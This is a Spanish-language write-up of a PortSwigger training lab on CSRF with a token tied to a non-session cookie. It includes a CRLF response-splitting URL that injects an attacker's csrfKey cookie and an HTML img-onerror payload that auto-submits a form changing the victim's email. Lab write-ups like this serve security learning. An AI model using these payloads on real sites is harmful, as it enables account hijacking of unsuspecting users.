# PortSwigger Lab: CSRF where token is tied to non-session cookie

![PortSwigger](https://img.shields.io/badge/Plataforma-PortSwigger%20Academy-blue)
![Dificultad](https://img.shields.io/badge/Dificultad-Medio-orange)
![Tipo](https://img.shields.io/badge/Tipo-CSRF%20Cookie%20Injection-red)
![Estado](https://img.shields.io/badge/Estado-Completada-success)

Writeup del laboratorio de PortSwigger sobre CSRF con token ligado a cookie no-sesión.

## Técnicas utilizadas

- CSRF (Cross-Site Request Forgery)
- HTTP Response Splitting
- Cookie injection
- Cross-site cookie setting (SameSite=None)
- Timing attacks (img onerror + form submit)

## Flujo resumido

```
2 cuentas → Capturar token + csrfKey
→ Intercambiar entre cuentas → Funcionan juntos
→ Descubrir: token validado contra cookie, no sesión
→ Vector: campo de búsqueda refleja parámetro
→ Inyectar cookie con HTTP Response Splitting
→ Payload: img (inyecta cookie) + form (POST)
→ Exploit server → Víctima
```

## Vulnerabilidad clave

El servidor valida que `csrfKey` (cookie) + `csrf` (parámetro) **coincidan entre sí**, pero no valida que pertenezcan a la **sesión actual**.

Esto permite:
1. Obtener token + csrfKey válidos
2. Inyectar la cookie en navegador de la víctima
3. Enviar formulario con ambos valores
4. Petición aceptada aunque sea cross-site

## Inyección de cookie

Campo de búsqueda refleja parámetro como cookie. Usando CRLF (`%0d%0a`) se puede inyectar headers:

```
/?search=daw%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY%3b%20SameSite=None
```

## Payload

```html
<img src="https://target.com/?search=...INYECCION_COOKIE" 
     onerror="document.forms[0].submit()">

<form method="POST" action="https://target.com/my-account/change-email">
  <input name="email" value="attacker@attacker.com">
  <input name="csrf" value="VALID_TOKEN">
</form>
```

**Flujo:**
1. Imagen dispara GET con inyección de cookie
2. Imagen no existe → `onerror` se ejecuta
3. Cookie inyectada se incluye automáticamente
4. Formulario POST se envía con ambos valores
5. Validación pasa

## Diferencia con labs anteriores

Lab 4 es más sofisticado:
- Requiere encontrar vector de inyección
- HTTP Response Splitting para modificar headers
- Timing attack (imagen + onerror)
- Cookie debe tener `SameSite=None`

## Referencias

- [PortSwigger — CSRF tokens](https://portswigger.net/web-security/csrf#tokens)
- [OWASP — CSRF Prevention](https://owasp.org/www-community/attacks/csrf)
- [HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)
- [SameSite Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
